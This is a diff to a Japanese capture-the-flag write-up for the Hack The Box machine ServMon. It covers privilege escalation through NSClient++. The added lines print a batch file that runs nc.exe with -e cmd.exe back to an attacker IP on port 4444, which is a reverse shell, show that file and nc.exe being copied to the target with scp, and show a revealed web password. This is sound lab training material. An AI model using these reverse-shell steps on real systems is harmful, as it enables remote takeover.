@@ -1,5 +1,4 @@
 https://app.hackthebox.com/machines/240
-ぽんこつマシンなのでおすすめしない
 
 ## STEP 1
 ```sh
@@ -228,7 +227,7 @@ nadine@SERVMON C:\Users\Nadine>type Desktop\user.txt
 nsclient++が動作しているっぽい  
 <img src="https://github.com/mylovemyon/hackthebox_images/blob/main/ServMon_02.png">  
 実際にnsclient++がインストールされていることを確認
-```sh
+```powershell
 nadine@SERVMON C:\Users\Nadine>dir "c:\Program Files"
  Volume in drive C has no label.                                                   
  Volume Serial Number is 20C1-47A1                                                 
@@ -335,8 +334,42 @@ or
 Risk:
 The vulnerability allows local attackers to escalate privileges and execute arbitrary code as Local System
 ```
-PoC通りに実行していく  
-まずはwebログイン用のパスワード確認
+PoCではweb経由で作業しているが、web操作はよくわからんかったのでコマンドライン上で実行  
+https://nsclient.org/docs/howto/external_scripts/  
+PoC２番目、必要モジュールの有効を確認
+```powershell
+nadine@SERVMON C:\Users\Nadine>type "C:\Program Files\NSClient++\nsclient.ini" | find "CheckExternalScripts"
+; CheckExternalScripts - Module used to execute external scripts
+CheckExternalScripts = enabled
+; External scripts - A list of scripts available to run from the CheckExternalScripts module. Syntax is: `command=script arguments`
+; External script settings - General settings for the external scripts module (CheckExternalScripts).
+
+nadine@SERVMON C:\Users\Nadine>type "C:\Program Files\NSClient++\nsclient.ini" | find "Scheduler"
+; Scheduler - Use this to schedule check commands and jobs in conjunction with for instance passive monitoring through NSCA
+Scheduler = enabled
+; Schedules - Section for the Scheduler module.
+```
+PoC３番目のnc.exeとそれを実行するバッチを配送
+```sh
+└─$ cat test.bat                                     
+@echo off
+cmd /c "C:\Users\Nadine\nc.exe 10.10.16.28 4444 -e c:\windows\system32\cmd.exe" 
+                                                                                                                                                                       
+└─$ scp test.bat nadine@10.129.61.85:/Users/nadine/ 
+nadine@10.129.61.85's password: 
+test.bat                                                                                                                             100%   91     0.1KB/s   00:01
+
+└─$ cp /usr/share/windows-resources/binaries/nc.exe .
+
+└─$ scp nc.exe nadine@10.129.61.85:/Users/nadine/    
+nadine@10.129.61.85's password: 
+nc.exe                                                                                                                               100%   58KB  10.5KB/s   00:05
+```
+
+
+
+##　oha
+webログイン用のパスワード確認
 ```powershell
 nadine@SERVMON C:\Users\Nadine>"C:\Program Files\NSClient++\nscp.exe" web -- password --display
 Current password: ew2x6SsGTxjRwXOT
@@ -355,17 +388,4 @@ Microsoft Windows [Version 10.0.17763.864]
                                                      
 nadine@SERVMON C:\Users\Nadine>
 ```
-nc.exeとそれを実行するバッチを配送
-```sh
-└─$ cat test.bat                                     
-@echo off
-cmd -c "C:\Users\Nadine\nc.exe 10.10.16.28 4444 -e c:\windows\system32\cmd.exe"   
-                                                                                                                                                                       
-└─$ scp test.bat nadine@10.129.61.85:/Users/nadine/ 
-nadine@10.129.61.85's password: 
-test.bat                                                                                                                             100%   91     0.1KB/s   00:01
 
-└─$ scp nc.exe nadine@10.129.61.85:/Users/nadine/    
-nadine@10.129.61.85's password: 
-nc.exe                                                                                                                               100%   58KB  10.5KB/s   00:05
-```
